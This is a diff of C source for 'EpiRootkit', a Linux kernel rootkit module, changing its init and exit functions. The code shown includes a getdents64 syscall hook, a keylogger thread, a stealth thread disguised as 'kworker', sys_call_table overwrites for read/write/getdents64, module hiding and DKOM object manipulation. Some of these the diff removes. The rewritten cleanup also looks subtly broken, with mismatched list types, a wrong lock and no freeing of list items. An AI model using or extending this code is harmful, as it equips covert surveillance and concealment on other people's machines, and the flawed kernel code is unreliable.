@@ -232,6 +232,7 @@ static asmlinkage long hook_getdents64(const struct pt_regs *regs) {
     return ret;
 }
 
+// Module initialization
 static int __init epirootkit_init(void) {
     printk(KERN_INFO "EpiRootkit: Initializing...\n");
     
@@ -241,72 +242,38 @@ static int __init epirootkit_init(void) {
     // Initialize spinlock
     spin_lock_init(&hook_lock);
     
-    g_keylog_thread = kthread_run(keylog_thread, NULL, "keylog_thread");
-    if (IS_ERR(g_keylog_thread)) {
-        g_keylog_thread = NULL;
-    }
-    
-    g_stealth_thread = kthread_run(stealth_thread, NULL, "kworker/%d", 0);
-    if (IS_ERR(g_stealth_thread)) {
-        free_secure_memory(mem_manager.nonpaged_memory);
-        return PTR_ERR(g_stealth_thread);
+    // Allocate non-paged memory
+    mem_manager.nonpaged_size = PAGE_SIZE;
+    mem_manager.nonpaged_memory = kmalloc(mem_manager.nonpaged_size, GFP_KERNEL);
+    if (!mem_manager.nonpaged_memory) {
+        printk(KERN_ERR "EpiRootkit: Failed to allocate non-paged memory\n");
+        return -ENOMEM;
     }
     
     printk(KERN_INFO "EpiRootkit: Initialized successfully\n");
     return 0;
 }
 
+// Module cleanup
 static void __exit epirootkit_exit(void) {
+    struct dkom_entry *entry, *tmp;
+    unsigned long flags;
+    
     printk(KERN_INFO "EpiRootkit: Cleaning up...\n");
     
-    unsigned long flags;
-    struct dkom_entry *entry, *tmp;
-    struct hook_entry *hook_entry, *hook_tmp;
-
-    if (net_manager.thread)
-        kthread_stop(net_manager.thread);
-
-    if (g_stealth_thread)
-        kthread_stop(g_stealth_thread);
-
-    if (g_keylog_thread)
-        kthread_stop(g_keylog_thread);
-
-    if (net_manager.connection) {
-        sock_release(net_manager.connection);
-        net_manager.connection = NULL;
-    }
-
-    if (sys_call_table) {
-        sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
-        sys_call_table[__NR_read] = (unsigned long)original_read;
-        sys_call_table[__NR_write] = (unsigned long)original_write;
-    }
-
-    unhide_module();
-    keylog_buffer_cleanup();
-
-    if (mem_manager.nonpaged_memory) {
-        free_secure_memory(mem_manager.nonpaged_memory);
-        mem_manager.nonpaged_memory = NULL;
-    }
-
-    spin_lock_irqsave(&dkom_lock, flags);
-    list_for_each_entry_safe(entry, tmp, &dkom_entries, list) {
-        dkom_restore_object(entry->object);
-        list_del(&entry->list);
-        kfree(entry);
-    }
-    spin_unlock_irqrestore(&dkom_lock, flags);
-
+    // Clean up DKOM entries
     spin_lock_irqsave(&hook_lock, flags);
-    list_for_each_entry_safe(hook_entry, hook_tmp, &hook_entries, list) {
-        remove_hook(hook_entry->target);
-        list_del(&hook_entry->list);
-        kfree(hook_entry);
+    list_for_each_entry_safe(entry, tmp, &module_list, list) {
+        dkom_restore_object(entry);
     }
     spin_unlock_irqrestore(&hook_lock, flags);
-
+    
+    // Free non-paged memory
+    if (mem_manager.nonpaged_memory) {
+        free_secure_memory(mem_manager.nonpaged_memory, mem_manager.nonpaged_size);
+        mem_manager.nonpaged_memory = NULL;
+    }
+    
     printk(KERN_INFO "EpiRootkit: Cleanup complete\n");
 }
 
